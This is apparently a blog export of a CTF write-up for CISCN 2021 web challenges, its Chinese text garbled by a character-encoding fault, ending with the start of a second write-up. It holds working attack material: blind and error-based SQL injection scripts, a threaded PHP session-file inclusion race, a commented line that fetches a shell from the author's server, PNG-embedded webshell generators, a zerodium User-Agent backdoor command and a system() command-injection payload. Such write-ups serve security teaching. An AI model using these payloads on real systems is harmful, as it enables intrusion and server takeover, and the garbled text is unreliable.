[{"content":"å°±å‘ä¸‹webçš„ï¼Œæ‰€æœ‰wpæˆ³è¿™é‡Œ-\u0026gt;ç¬¬åå››å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ› Writeup by X1cT34m\nWeb easy_source åŸé¢˜ï¼ŒReflectionMethod æ„é€  User ç±»ä¸­çš„å‡½æ•°æ–¹æ³•ï¼Œå†é€šè¿‡ getDocComment è·å–å‡½æ•°çš„æ³¨é‡Š\nhttps://r0yanx.com/2020/10/28/fslh-writeup/\næäº¤å‚æ•°ï¼š\n?rc=ReflectionMethod\u0026amp;ra=User\u0026amp;rb=a\u0026amp;rd=getDocComment\rçˆ†ç ´rbçš„å€¼a-zï¼Œåœ¨qå¾—åˆ°flagï¼š\nCISCN{fvsgF-5rRwf-p8KZP-vOndu-SIQoM-}\neasy_sql fuzzï¼š\nsqlmapå¾—åˆ°è¡¨åflagå’Œä¸€ä¸ªåˆ—åidï¼šæŠ¥é”™åŠ æ— åˆ—åæ³¨å…¥\nä¸€å¼€å§‹ç”¨æŒ‰ä½æ¯”è¾ƒï¼š\nimport requests url = \u0026#39;http://124.70.35.238:23511/\u0026#39; def add(flag): res = \u0026#39;\u0026#39; res += flag return res flag = \u0026#39;\u0026#39; for i in range(1,200): for char in range(32, 127): hexchar = add(flag + chr(char)) payload = \u0026#34;1\u0026#39;) or (select 1,\u0026#39;NO\u0026#39;,\u0026#39;CISCN{JGHHS-JPD52-IJK4O-MGPDZ-DUFWI-\u0026#39;)\u0026gt;=(select * from security.flag limit 1)#\u0026#34;.format(hexchar) data = {\u0026#34;uname\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#39;passwd\u0026#39;:payload} r = requests.post(url=url, data=data) text = r.text if \u0026#39;login\u0026lt;\u0026#39; in r.text: flag += chr(char-1) print(flag) break åˆ°æœ€åå¡ä½äº†ï¼Œæ¢äº†æ— åˆ—åæ³¨å…¥æŠ¥é”™çˆ†åˆ—åï¼Œç„¶åç›´æ¥æŠ¥é”™æ³¨å…¥ï¼š\nadmin\u0026#39;)||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))# //Duplicate column name \u0026#39;e0f1d955-bbba-43c3-b078-a81b3fc4bf28\u0026#39; admin\u0026#39;)||(extractvalue(1,concat(0x7e,(select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),0x7e)))# //XPATH syntax error: \u0026#39;~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d\u0026#39; admin\u0026#39;)||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))# //XPATH syntax error: \u0026#39;~uFWI-}~\u0026#39; CISCN{JgHhs-jpd52-iJk4O-MGPDz-duFWI-}\nmiddle_source é¦–é¡µç»™äº†ä»»æ„æ–‡ä»¶åŒ…å«\næ‰«ç›®å½•å¾—åˆ°.listingï¼Œå¾—åˆ°you_can_seeeeeeee_me.phpæ˜¯phpinfoé¡µé¢\næœ‰äº†phpinfoå¯ä»¥å°è¯•ç›´æ¥å‘phpinfoé¡µé¢ä¼ æ–‡ä»¶åŠ åƒåœ¾æ•°æ®ï¼ŒåŒæ—¶ä»phpinfoè·å–ä¸´æ—¶æ–‡ä»¶åè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œæˆ–è€…åˆ©ç”¨session.upload_progressè¿›è¡Œsessionæ–‡ä»¶åŒ…å«\nå‰è€…å°è¯•æ— æ•ˆæœ\nä»phpinfoå¾—åˆ°äº†sessionä¿å­˜è·¯å¾„ï¼š/var/lib/php/sessions/fccecfeaje/\nå°è¯•å‘ç°å¯ä»¥å‡ºç½‘ï¼Œè™½ç„¶banäº†å¾ˆå¤šå‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥ç”¨copyæˆ–file_get_contentsä¸‹è½½shell\nåœ¨/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444gå‘ç°flag\nexpï¼š\nimport requests import threading #file_content = \u0026#39;\u0026lt;?php print_r(scandir(\u0026#34;/etc\u0026#34;));?\u0026gt;\u0026#39; #file_content = \u0026#39;\u0026lt;?php copy(\u0026#34;http://myvps/s.txt\u0026#34;,\u0026#34;/tmp/leon.php\u0026#34;);echo \u0026#34;666666666\u0026#34;;?\u0026gt;\u0026#39; #s.txtæ˜¯shellä¸€å¥è¯ file_content = \u0026#39;\u0026lt;?php var_dump(file_get_contents(\u0026#34;/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g\u0026#34;));?\u0026gt;\u0026#39; url=\u0026#39;http://124.70.35.238:23579/\u0026#39; r=requests.session() def POST(): while True: file={ \u0026#34;upload\u0026#34;:(\u0026#39;\u0026lt;?php echo 999;?\u0026gt;\u0026#39;, file_content, \u0026#39;image/jpeg\u0026#39;) } data={ \u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34;:file_content } headers={ \u0026#34;Cookie\u0026#34;:\u0026#39;PHPSESSID=1234\u0026#39; } r.post(url,files=file,headers=headers,data=data) def READ(): while True: event.wait() t=r.post(\u0026#34;http://124.70.35.238:23579/\u0026#34;, data={\u0026#34;cf\u0026#34;:\u0026#39;../../../../../../../../../../var/lib/php/sessions/fccecfeaje/sess_1234\u0026#39;}) if len(t.text) \u0026lt; 2230: print(\u0026#39;[+]retry\u0026#39;) else: print(t.text) event.clear() event=threading.Event() event.set() threading.Thread(target=POST,args=()).start() threading.Thread(target=POST,args=()).start() threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start() CISCN{yo19m-ZqNC1-URusV-u83jg-zxqpZ-}\nupload mb_strtolowerã€PHPäºŒæ¬¡æ¸²æŸ“\nè¿™é“é¢˜æ”¶å·ä¸¤å°æ—¶ä¹‹å‰å°±çœ‹åˆ°phpinfoäº†ï¼Œä½†æ˜¯æ²¡åšå‡ºæ¥ï¼Œæœ‰ç‚¹å¯æƒœ\nè®¿é—®é¢˜ç›®å°±æœ‰æºç \nindex.php\n\u0026lt;?php if (!isset($_GET[\u0026#34;ctf\u0026#34;])) { highlight_file(__FILE__); die(); } if(isset($_GET[\u0026#34;ctf\u0026#34;])) $ctf = $_GET[\u0026#34;ctf\u0026#34;]; if($ctf==\u0026#34;upload\u0026#34;) { if ($_FILES[\u0026#39;postedFile\u0026#39;][\u0026#39;size\u0026#39;] \u0026gt; 1024*512) { die(\u0026#34;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ\u0026#34;); } $imageinfo = getimagesize($_FILES[\u0026#39;postedFile\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if ($imageinfo === FALSE) { die(\u0026#34;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†\u0026#34;); } if ($imageinfo[0] !== 1 \u0026amp;\u0026amp; $imageinfo[1] !== 1) { die(\u0026#34;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ\u0026#34;); } $fileName=urldecode($_FILES[\u0026#39;postedFile\u0026#39;][\u0026#39;name\u0026#39;]); if(stristr($fileName,\u0026#34;c\u0026#34;) || stristr($fileName,\u0026#34;i\u0026#34;) || stristr($fileName,\u0026#34;h\u0026#34;) || stristr($fileName,\u0026#34;ph\u0026#34;)) { die(\u0026#34;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†\u0026#34;); } $imagePath = \u0026#34;image/\u0026#34; . mb_strtolower($fileName); if(move_uploaded_file($_FILES[\u0026#34;postedFile\u0026#34;][\u0026#34;tmp_name\u0026#34;], $imagePath)) { echo \u0026#34;upload success, image at $imagePath\u0026#34;; } else { die(\u0026#34;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»\u0026#34;); } } æ‰«ç›®å½•èƒ½æ‰«åˆ°example.php\n\u0026lt;?php if (!isset($_GET[\u0026#34;ctf\u0026#34;])) { highlight_file(__FILE__); die(); } if(isset($_GET[\u0026#34;ctf\u0026#34;])) $ctf = $_GET[\u0026#34;ctf\u0026#34;]; if($ctf==\u0026#34;poc\u0026#34;) { $zip = new \\ZipArchive(); $name_for_zip = \u0026#34;example/\u0026#34; . $_POST[\u0026#34;file\u0026#34;]; if(explode(\u0026#34;.\u0026#34;,$name_for_zip)[count(explode(\u0026#34;.\u0026#34;,$name_for_zip))-1]!==\u0026#34;zip\u0026#34;) { die(\u0026#34;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ\u0026#34;); } if ($zip-\u0026gt;open($name_for_zip) !== TRUE) { die (\u0026#34;éƒ½ä¸èƒ½è§£å‹å‘¢\u0026#34;); } echo \u0026#34;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ\u0026#34;; $pos_for_zip = \u0026#34;/tmp/example/\u0026#34; . md5($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); $zip-\u0026gt;extractTo($pos_for_zip); $zip-\u0026gt;close(); unlink($name_for_zip); $files = glob(\u0026#34;$pos_for_zip/*\u0026#34;); foreach($files as $file){ if (is_dir($file)) { continue; } $first = imagecreatefrompng($file); $size = min(imagesx($first), imagesy($first)); $second = imagecrop($first, [\u0026#39;x\u0026#39; =\u0026gt; 0, \u0026#39;y\u0026#39; =\u0026gt; 0, \u0026#39;width\u0026#39; =\u0026gt; $size, \u0026#39;height\u0026#39; =\u0026gt; $size]); if ($second !== FALSE) { $final_name = pathinfo($file)[\u0026#34;basename\u0026#34;]; imagepng($second, \u0026#39;example/\u0026#39;.$final_name); imagedestroy($second); } imagedestroy($first); unlink($file); } } bypass image size ä¸Šä¼ å¤„å¯¹å›¾ç‰‡çš„å°ºå¯¸åšå‡ºäº†è¦æ±‚ï¼Œæ­¤æ—¶æœ‰ä¸€ç§æ–¹æ³•æ¥ç»•è¿‡ã€‚å°†ä¸‹åˆ—ä»£ç æ‹¼æ¥åˆ°POSTæµæœ€åå³å¯ç»•è¿‡ getimagesize çš„æ£€æµ‹\n#define width 1\r#define height 1\rç»è¿‡ä¸€ç•ªè°ƒè¯•ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªtxtæ–‡ä»¶å’Œä¸€ä¸ªphpæ–‡ä»¶æ‰“åŒ…ä¸€ä¸ªå‹ç¼©åŒ…ä¸Šä¼ ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠ“åŒ…åœ¨POSTæ•°æ®æµæœ€åæ‰‹åŠ¨åŠ ä¸Šè¿™ä¸¤è¡Œ\nbypass zip mb_strtolowerå¯ä»¥å…¼å®¹unicodeå­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨unicodeå­—ç¬¦Ä°ï¼Œç»è¿‡mb_strtolowerè½¬æ¢å˜æˆå°å†™å­—æ¯i\nhttps://www.compart.com/en/unicode/U+1D5A8\n\u0026lt;?php echo mb_strtolower(\u0026#39;Ä°\u0026#39;); //iÌ‡ åœ¨exampleè§£å‹çš„æ—¶å€™è‡ªç„¶æ˜¯../ç›®å½•ç©¿è¶Šè§£å‹æˆ‘ä»¬ä¸Šä¼ çš„å‹ç¼©åŒ…\nç„¶åå°±æ˜¯imagecreatefrompngï¼Œè¿™ä¸ªå‡½æ•°åªè¦ä½ ç¡®ç¡®å®å®æ˜¯ä¸€å¼ å›¾ç‰‡(ä¹Ÿå°±æ˜¯Windowsä¸‹æ”¹åç¼€ä¸ºpngï¼Œèƒ½æ­£å¸¸æ‰“å¼€)å°±å¯ä»¥è¿‡ï¼Œä¹‹åä»–ä½¿ç”¨imagepngå‡½æ•°æŠŠè¿™ä¸ªæ–‡ä»¶è¾“å‡ºåˆ°webè·¯å¾„ï¼Œä¸è¿‡é—æ†¾çš„æ˜¯ï¼Œç»è¿‡è¿™ä¸ªä¸¤ä¸ªå‡½æ•°ä¸€è¯»ä¸€è¾“å‡ºï¼Œå›¾ç‰‡å†…å®¹ä¼šå˜\nä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡Windows cmdçš„copyå‘½ä»¤ç”Ÿæˆçš„å›¾ç‰‡é©¬ï¼Œä¸é¡¶ç”¨ï¼Œå¾—æ¢é«˜çº§å¾—é©¬å„¿\nè¿™å°±æ˜¯PHPäºŒæ¬¡æ¸²æŸ“ç»•è¿‡ã€‚åœ¨æ­¤ä¹‹å‰å…ˆæ’ä¸ªé¢„å¤‡çŸ¥è¯†ï¼Œä»‹ç»ä¸‹PNGçš„æ„é€ \nPNGç»“æ„ png æ”¯æŒä¸‰ç§å›¾åƒç±»å‹\n ç´¢å¼•å½©è‰²å›¾åƒ(index-color images) ç°åº¦å›¾åƒ(grayscale images) çœŸå½©è‰²å›¾åƒ(true-color images)  png æ ‡è¯† png æ ‡è¯†ä½œä¸º png å›¾ç‰‡çš„å¤´éƒ¨ï¼Œä¸ºå›ºå®šçš„ 8 å­—èŠ‚\n89 50 4E 47 OD 0A 1A 0A\ræ•°æ®å— png å®šä¹‰äº†ä¸¤ç§ç±»å‹çš„æ•°æ®å—ï¼Œä¸€ç§æ˜¯ç§°ä¸ºå…³é”®æ•°æ®å—(critical chunk)ï¼Œæ ‡å‡†çš„æ•°æ®å—; å¦ä¸€ç§å«åšè¾…åŠ©æ•°æ®å—(ancillary chunks)ï¼Œå¯é€‰çš„æ•°æ®å—ã€‚\nå…³é”®æ•°æ®å—å®šä¹‰äº†3ä¸ªæ ‡å‡†æ•°æ®å—ï¼Œæ¯ä¸ª png æ–‡ä»¶éƒ½å¿…é¡»åŒ…å«å®ƒä»¬ã€‚3ä¸ªæ ‡å‡†æ•°æ®å—ä¸º: IHDRï¼Œ IDATï¼Œ IEND\nè¿™é‡Œä»‹ç»4ä¸ªï¼š\n  æ–‡ä»¶å¤´æ•°æ®å—IHDR(header chunk)\n  è°ƒè‰²æ¿æ•°æ®å—PLTE(palette chunk)\n  å›¾åƒæ•°æ®å—IDAT(image data chunk)\n  å›¾åƒç»“æŸæ•°æ®IEND(image trailer chunk)\n  æ¯ä¸ªæ•°æ®å—éƒ½ç”±ä¸‹è¡¨æ‰€ç¤ºçš„çš„4ä¸ªåŸŸç»„æˆã€‚\n   åç§° å­—èŠ‚æ•° è¯´æ˜     Length(é•¿åº¦) 4å­—èŠ‚ æŒ‡å®šæ•°æ®å—ä¸­æ•°æ®åŸŸçš„é•¿åº¦ï¼Œå…¶é•¿åº¦ä¸è¶…è¿‡$(2^{31}-1)$å­—èŠ‚   Chunk Type Code(æ•°æ®å—ç±»å‹ç ) 4å­—èŠ‚ æ•°æ®å—ç±»å‹ç ç”±ASCIIå­—æ¯(A-Zå’Œa-z)ç»„æˆ   Chunk Data(æ•°æ®å—å®é™…å†…å®¹) å¯å˜é•¿åº¦ å­˜å‚¨æŒ‰ç…§Chunk Type CodeæŒ‡å®šçš„æ•°æ®   CRC(å¾ªç¯å†—ä½™æ£€æµ‹) 4å­—èŠ‚ å­˜å‚¨ç”¨æ¥æ£€æµ‹æ˜¯å¦æœ‰é”™è¯¯çš„å¾ªç¯å†—ä½™ç     å…¶ä¸­CRC(cyclic redundancy check)åŸŸä¸­çš„å€¼æ˜¯å¯¹Chunk Type CodeåŸŸå’ŒChunk DataåŸŸä¸­çš„æ•°æ®è¿›è¡Œè®¡ç®—å¾—åˆ°çš„ï¼Œå¯ä»¥çœ‹åšä¸€ç§æ ¡éªŒç \n   æ–‡ä»¶å¤´æ•°æ®å—IHDR(header chunk)ï¼š\nå®ƒåŒ…å«æœ‰PNGæ–‡ä»¶ä¸­å­˜å‚¨çš„å›¾åƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶è¦ä½œä¸ºç¬¬ä¸€ä¸ªæ•°æ®å—å‡ºç°åœ¨PNGæ•°æ®æµä¸­ï¼Œè€Œä¸”ä¸€ä¸ªPNGæ•°æ®æµä¸­åªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶å¤´æ•°æ®å—ã€‚\n  è°ƒè‰²æ¿æ•°æ®å—PLTE(palette chunk)ï¼š\nå®ƒåŒ…å«æœ‰ä¸ç´¢å¼•å½©è‰²å›¾åƒ((indexed-color image))ç›¸å…³çš„å½©è‰²å˜æ¢æ•°æ®ï¼Œå®ƒä»…ä¸ç´¢å¼•å½©è‰²å›¾åƒæœ‰å…³ï¼Œè€Œä¸”è¦æ”¾åœ¨å›¾åƒæ•°æ®å—(image data chunk)ä¹‹å‰ã€‚çœŸå½©è‰²çš„PNGæ•°æ®æµä¹Ÿå¯ä»¥æœ‰è°ƒè‰²æ¿æ•°æ®å—ï¼Œç›®çš„æ˜¯ä¾¿äºéçœŸå½©è‰²æ˜¾ç¤ºç¨‹åºç”¨å®ƒæ¥é‡åŒ–å›¾åƒæ•°æ®ï¼Œä»è€Œæ˜¾ç¤ºè¯¥å›¾åƒã€‚ç»“æ„å¦‚ä¸‹ï¼š\n     é¢œè‰² å­—èŠ‚ æ„ä¹‰     Red 1 byte 0 = é»‘è‰², 255 = çº¢   Green 1 byte 0 = é»‘è‰², 255 = ç»¿è‰²   Blue 1 byte 0 = é»‘è‰², 255 = è“è‰²    PLTEæ•°æ®å—æ˜¯å®šä¹‰å›¾åƒçš„è°ƒè‰²æ¿ä¿¡æ¯ï¼ŒPLTEå¯ä»¥åŒ…å«1~256ä¸ªè°ƒè‰²æ¿ä¿¡æ¯ï¼Œæ¯ä¸€ä¸ªè°ƒè‰²æ¿ä¿¡æ¯ç”±3ä¸ªå­—èŠ‚ç»„æˆï¼Œå› æ­¤è°ƒè‰²æ¿æ•°æ®å—æ‰€åŒ…å«çš„æœ€å¤§å­—èŠ‚æ•°ä¸º768ï¼Œè°ƒè‰²æ¿çš„é•¿åº¦åº”è¯¥æ˜¯3çš„å€æ•°ï¼Œå¦åˆ™ï¼Œè¿™å°†æ˜¯ä¸€ä¸ªéæ³•çš„è°ƒè‰²æ¿ã€‚\rå¯¹äºç´¢å¼•å›¾åƒï¼Œè°ƒè‰²æ¿ä¿¡æ¯æ˜¯å¿…é¡»çš„ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²ç´¢å¼•ä»0å¼€å§‹ç¼–å·ï¼Œç„¶åæ˜¯1ã€2â€¦â€¦ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²æ•°ä¸èƒ½è¶…è¿‡è‰²æ·±ä¸­è§„å®šçš„é¢œè‰²æ•°ï¼ˆå¦‚å›¾åƒè‰²æ·±ä¸º4çš„æ—¶å€™ï¼Œè°ƒè‰²æ¿ä¸­çš„é¢œè‰²æ•°ä¸å¯ä»¥è¶…è¿‡2^4=16ï¼‰ï¼Œå¦åˆ™ï¼Œè¿™å°†å¯¼è‡´PNGå›¾åƒä¸åˆæ³•ã€‚\r  å›¾åƒæ•°æ®å—IDAT(image data chunk)ï¼š  å®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—ã€‚\nIDATå­˜æ”¾ç€å›¾åƒçœŸæ­£çš„æ•°æ®ä¿¡æ¯\n  å›¾åƒç»“æŸæ•°æ®IEND(image trailer chunk)ï¼š\nå®ƒç”¨æ¥æ ‡è®°PNGæ–‡ä»¶æˆ–è€…æ•°æ®æµå·²ç»ç»“æŸï¼Œå¹¶ä¸”å¿…é¡»è¦æ”¾åœ¨æ–‡ä»¶çš„å°¾éƒ¨ã€‚\n00 00 00 00 49 45 4E 44 AE 42 60 82\r\tç”±äºæ•°æ®å—ç»“æ„çš„å®šä¹‰ï¼ŒIENDæ•°æ®å—çš„é•¿åº¦æ€»æ˜¯0ï¼ˆ00 00 00 00ï¼Œé™¤éäººä¸ºåŠ å…¥ä¿¡æ¯ï¼‰ï¼Œæ•°æ®æ ‡è¯†æ€»æ˜¯IENDï¼ˆ49 45 4E 44ï¼‰ï¼Œå› æ­¤ï¼ŒCRCç ä¹Ÿæ€»æ˜¯AE 42 60 82\r  å†™ğŸæ€è·¯ äº†è§£äº†pngç»“æ„ä¹‹åï¼Œæˆ‘ä»¬å¤§æ¦‚æœ‰ä¸¤ç§æ€è·¯æ„é€ webshell\n  å‘PLTEæ’å…¥phpä»£ç \nhttps://github.com/hxer/imagecreatefrom-/tree/master/png/analysis\n åˆ†æåº•å±‚æºç å¯çŸ¥ï¼Œ png signature æ˜¯ä¸å¯èƒ½æ’å…¥ php ä»£ç çš„ï¼› IHDR å­˜å‚¨çš„æ˜¯ png çš„å›¾ç‰‡ä¿¡æ¯ï¼Œæœ‰å›ºå®šçš„é•¿åº¦å’Œæ ¼å¼ï¼Œç¨‹åºä¼šæå–å›¾ç‰‡ä¿¡æ¯æ•°æ®è¿›è¡ŒéªŒè¯ï¼Œå¾ˆéš¾æ’å…¥ php ä»£ç ï¼›è€Œ PLTE ä¸»è¦è¿›è¡Œäº† CRC æ ¡éªŒå’Œé¢œè‰²æ•°åˆæ³•æ€§æ ¡éªŒç­‰ç®€å•çš„æ ¡éªŒï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½åœ¨ data åŸŸæ’å…¥ php ä»£ç ã€‚\nä»å¯¹ PLTE chunk éªŒè¯çš„åˆ†æå¯çŸ¥ï¼Œ å½“åŸå§‹å›¾ç‰‡æ ¼å¼ç»™ç´¢å¼•å›¾ç‰‡æ—¶ï¼ŒPLTE æ•°æ®å—åœ¨æ»¡è¶³ png æ ¼å¼è§„èŒƒçš„æƒ…å†µä¸‹ï¼Œç¨‹åºè¿˜ä¼šè¿›è¡Œ CRC æ ¡éªŒå’Œé•¿åº¦åˆæ³•æ€§éªŒè¯ã€‚å› æ­¤ï¼Œè¦å°† PHP ä»£ç å†™å…¥ PLTE æ•°æ®å—ï¼Œä¸ä»…è¦ä¿®æ”¹ data åŸŸçš„å†…å®¹ä¸ºphpä»£ç ï¼Œç„¶åä¿®æ”¹ CRC ä¸ºæ­£ç¡®çš„ CRC æ ¡éªŒå€¼ï¼Œå½“è¦å¡«å……çš„ä»£ç è¿‡é•¿æ—¶ï¼Œå¯ä»¥æ”¹å˜ length åŸŸçš„æ•°å€¼ï¼Œæ»¡è¶³ length ä¸º3çš„å€æ•°ï¼Œ ä¸”é¢œè‰²æ•°ä¸è¶…è¿‡è‰²æ·±ä¸­è§„å®šçš„é¢œè‰²æ•°ã€‚ä¾‹å¦‚: IHDR æ•°æ®å—ä¸­ Bit depth ä¸º 08, åˆ™æœ€å¤§çš„é¢œè‰²æ•°ä¸º 2^8=256, é‚£ä¹ˆ PLTE æ•°æ®å— data çš„é•¿åº¦ä¸è¶…è¿‡ 3*256=0x300ã€‚ è¿™ä¸ªé•¿åº¦å¯¹å†™å…¥ php ä¸€å¥è¯æœ¨é©¬æˆ–è€…åˆ›å»ºåé—¨æ–‡ä»¶è¶³å¤Ÿäº†ã€‚\n é€šè¿‡æ–‡ç« çš„expæ„é€ çš„webshellï¼Œèƒ½è¿‡åªæœ‰imagecreatefrompngå’Œimagepngçš„ã€‚\nä½†æ˜¯ç»è¿‡é¢˜ç›®imagecropè¿™ç§è£å‰ªï¼Œä¼šè¢«æœ‰è§„å¾‹çš„åæ‰\nè§£å†³æ–¹æ¡ˆæ˜¯å¯ä»¥ç¡¬è°ƒï¼š\n*/$\u0026lt;?=_GET/**/[fghijk;/*(/*rstuvw0])*/e$%^val/*+//\r//å°±é—®è¿™æ˜¯äººèƒ½è°ƒå‡ºæ¥çš„ä¹ˆï¼Ÿ\u0026lt;?=eval($_GET[0]);\r  å‘IDATæ’å…¥phpä»£ç \nåŸç†å‰–æï¼šhttps://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/\nexpï¼šhttps://github.com/huntergregal/PNG-IDAT-Payload-Generator/\nå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨phpç‰ˆæœ¬çš„expï¼š\n\u0026lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,\u0026#39;wh1sper.php\u0026#39;);//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„ /* æœ¨é©¬å†…å®¹ \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; */ ç½‘ä¸Šçš„wpå¤§å¤šéƒ½ç”¨çš„ç¬¬äºŒç§æ–¹æ³•ï¼Œç”¨pythonçš„expã€‚ç„¶åæ˜¯æŠŠ$_GET[0]æ”¹æˆäº†EVALï¼Œç„¶åéœ€è¦æŒ‰ç…§ç®—æ³•è®¡ç®—ä¸€ä¸‹crc\nhttps://blog.csdn.net/miuzzx/article/details/116885083\nhttps://lemonprefect.cn/zh-cn/posts/7c083fa1#imagecreatefrompng-bypass\n ä½¿ç”¨å‚è€ƒçš„ Repo ä¸­çš„ä»£ç å¯ä»¥ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º 25 çš„ä»»æ„ PHP payload çš„æ­£æ–¹å½¢å›¾ç‰‡ï¼Œåªéœ€è¦å°†è‡ªå¸¦çš„ payload ç»è¿‡ Raw Deflate ä¹‹åå† Inflate å³å¯\n   é¢˜å¤–è¯ è¿™ä¸ªå§¿åŠ¿å¹¶ä¸æ˜¯æ–°ä¸œè¥¿ï¼Œåœ¨upload-labs17å’ŒDDCTFéƒ½å‡ºç°è¿‡ï¼Œæ²¡åšå‡ºæ¥è¿˜æ˜¯è¯´æ˜é¢˜åˆ·å°‘äº†\nå¦å¤–è¿˜æœ‰å…¶ä»–å›¾ç‰‡çš„äºŒæ¬¡æ¸²æŸ“å…·ä½“å¯ä»¥çœ‹çœ‹ï¼šhttps://www.sqlsec.com/2020/10/upload.html#toc-heading-17\næŒ–å‘ è¿™æ¬¡å›½èµ›é¢˜ç›®é¡¶å•Šï¼Œåé¢çš„æ¯é“é¢˜éƒ½è›®ä¸é”™çš„ï¼Œå¯æƒœä¸çŸ¥é“æœ‰æ²¡æœ‰æœºä¼šäº†ï¼Œç­‰ä»¥åæœ‰ç¼˜å°±å†²äº†ä»–\n","date":"2021-05-16T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174112.jpg","permalink":"https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-web/","title":"CISCN 2021 Quals Writeup web"},{"content":"MISC ä½ ä¼šæ—¥å¿—åˆ†æå— æ—¶é—´æ³¨å…¥ï¼Œæ‰‹æ’¸æ—¥å¿—å¾—åˆ°asciiç ï¼Œè½¬æ¢åˆ°ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==ï¼Œbase64è§£å¯†\nWeb ç­¾åˆ° ç­¾åˆ°è®¿é—®ä»»æ„PHPæ–‡ä»¶ï¼ŒUser-Agentt: zerodiumphpinfo();\nUser-Agentt: zerodiumsystem(\u0026lsquo;cat /flag\u0026rsquo;);\nunsetme çœ‹åˆ°æ˜¯fatfreeæ¡†æ¶ï¼Œgithubä¸‹è½½æœ€æ–°fatfree-3.7.3æºç ï¼Œæœ¬åœ°index.phpæ”¹æˆé¢˜ç›®ç»™çš„\nä¼ å‚åçœ‹åˆ°debugçš„è°ƒç”¨æ ˆï¼Œæœ¬åœ°åŠ¨æ€è°ƒè¯•ä¸€ä¸‹\nç›´æ¥åœ¨unsetä¸‹æ–­ç‚¹\nè·Ÿè¿›åˆ°base.phpï¼Œçœ‹åˆ°530è¡Œå·¦å³æœ‰evalï¼Œå› ä¸ºæ˜¯æ‹¼æ¥æ‰§è¡Œæ‰€ä»¥çŒœæµ‹å­˜åœ¨å‘½ä»¤æ³¨å…¥\nè™½ç„¶å¯¹å¼•å·ç­‰æœ‰è½¬ä¹‰ï¼Œä½†æ˜¯ç»•ä¸€ä¸‹å°±okï¼Œè°ƒè¯•çš„æ—¶å€™å‘ç°ä¸»è¦æ˜¯å®ƒå¯¹[]è¿‡æ»¤çš„æœ‰ç‚¹é—®é¢˜\n?a=n[]);system($_POST[0]);echo(1 POST: 0=cat /flag flag{d77d7d9b-941a-4087-949f-c72a466f9c5b}\nâ€œæ…¢æ…¢åšâ€ç®¡ç†ç³»ç»Ÿ ç¬¬ä¸€æ­¥MD5å“ˆå¸Œæ³¨å…¥ï¼Œå¯†ç kydba\nç¬¬äºŒæ­¥Gopheræ‰“admin.phpï¼Œå­˜åœ¨å †å æ³¨å…¥ï¼Œç”¨å¼ºç½‘æ¯éšä¾¿æ³¨çš„renameæ”¹è¡¨åèƒ½å¾—åˆ°admin_innerçš„è´¦æˆ·å¯†ç 